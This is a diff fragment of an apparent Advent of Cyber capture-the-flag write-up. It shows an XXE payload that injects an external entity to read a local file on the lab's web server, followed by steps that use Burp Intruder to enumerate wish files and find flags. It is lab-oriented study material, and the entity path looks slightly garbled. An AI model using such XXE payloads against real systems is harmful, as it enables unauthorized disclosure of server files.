@@ -62,12 +62,20 @@ put is snippet in product.php repeater request above xml
 url/wishes/wish_21.txt to access this site:
 ```xml 
 <!--?xml version=""1.0 ?-->
-<!DOCTYPE foo[<!ENTITY payload SYSTEM "/var/www/html/wishes/wish">]
+<!DOCTYPE foo[<!ENTITY payload SYSTEM "/var/www/html/wishes/wish_21/txt">]
 <wishlist> 
-<user_id>1</user_id> 
+	<user_id>1</user_id> 
 <item> 
-<product_id>&payload;</product_id> 
+	<product_id>&payload;</product_id> 
 </item> 
 </wishlist> 
 ```
+
+we can access other wishes by changing wish_21.txt or
+send it to intruder > now mark the number and select add
+then go to payload > select payload type: number & from : 1 , to : 20 >start attack
+and find flag in payload 15 that is answer of question
+
+now url/CHANGELOG
+	find flag of next question 
 #AOC 
